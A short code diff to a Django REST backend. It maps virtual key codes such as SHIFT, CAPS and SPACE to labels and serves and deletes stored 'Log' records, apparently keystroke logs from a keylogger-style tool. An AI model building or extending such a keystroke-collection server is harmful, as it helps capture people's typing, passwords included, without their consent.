@@ -58,6 +58,8 @@ KEYS = [
     [0x10, '[SHIFT]'],
     # CAPS LOCK
     [0x14, '[CAPS]'],
+    # SPACE
+    [0x20, ' ']
 ]
 
 @api_view(['GET', 'POST'])
@@ -84,7 +86,7 @@ def ping(request):
 
 
 @api_view(['GET'])
-@permission_classes([AllowAny])
+# @permission_classes([AllowAny])
 def getData(request, code):
     paginator = PageNumberPagination()
     paginator.page_size = 3
@@ -104,4 +106,13 @@ def getData(request, code):
             
         l["hr"] = humanReadableData
     return Response(logSerializer.data, status=status.HTTP_200_OK)
+
+
+@api_view(['DELETE'])
+# @permission_classes([AllowAny])
+def deleteData(request, id):
+    query = Log.objects.get(pk = id)
+    query.delete()
+    
+    return Response(status=status.HTTP_200_OK)
 
